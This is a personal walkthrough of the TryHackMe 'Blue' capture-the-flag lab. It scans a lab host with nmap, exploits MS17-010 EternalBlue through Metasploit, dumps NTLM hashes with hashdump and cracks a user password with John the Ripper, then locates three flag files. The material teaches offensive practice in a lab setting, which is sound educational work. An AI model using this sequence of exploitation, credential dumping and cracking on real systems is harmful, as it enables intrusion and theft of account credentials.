# Blue Room Tryhackme review.

might not include pictures in the review, just a reminder.

## Tools learnt and used:

1. Nmap 

2. Metaspoit

3. John the ripper

### First steps

- perform scanning with nmap
  
  - command used `nmap -sS -sV 10.10.141.125 -T4 or nmap -A -T4 10.10.141.125`.
  
  - The command above performs a stealth scan, shows all versions of available open ports, scans valid ports.

- enumerate open ports to find vulnerabilities.
  
  - using nmap `--script` to scan for vulnerabilities
  
  - `nmap --script vuln 10.10.141.125`
  
  - got a hit for vulnerable to ms17-010.

- Starting msfconsole since we already have an attack path and plan.
  
  - ms17-010 is smb vulnerability and gives us the ability to perform remote code execution.

- In msfconsole we need to search for the vulnerability we got to find an exploit.
  
  - `search ms17-010`
  
  - `exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption` - our result.

- We will use the result, but before running the exploit, we need to confirm if all our options are set. such as rhosts.
  
  - `set rhosts 10.10.141.125`
  
  - check if the hosts is vulnerable by running `check.

- We are in and we have to check if we have the necessary privileges using; `getuid`.  If we are *NT/ AUTHORITY\SYSTEM*, then we are root and the house is all ours.

- I need to the users passwords from the SAM file, though they will be hashed, we will crack them later.
  
  - `hashdump` - the command we run to dump all the passwords.
  
  - `Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::`
  
  - The username starts then permission, the hashed password. lm hash and nt hash.

- spin john to get cracking.
  
  - we need to get the password of the last user. We copy the hash and create a txt file containing it; `echo Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: > hash.txt`
  
  - `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`

- We get the userpassword as `alqfna22`

- We need to find three flag files hidden in the system.
  
  - We have to get our hands dirty by gettin into the shell `shell`
  
  - By default we are in system32 and we need to get to root to perform our search `cd /`
  
  - To search for our  files, we use;
    
    - `dir /s /b "flag1.txt`
    
    - `/s` searches all subdirectories
    
    - `/b` returns file path
  
  - for {flag1.txt} - `C:\`
  
  - for {flag2.txt} -`C:\Windows\System32\config\flag2.txt`
  
  - for {flag3.txt} -`C:\Users\Jon\Documents\flag3.txt`

- We are done with the challenge.s
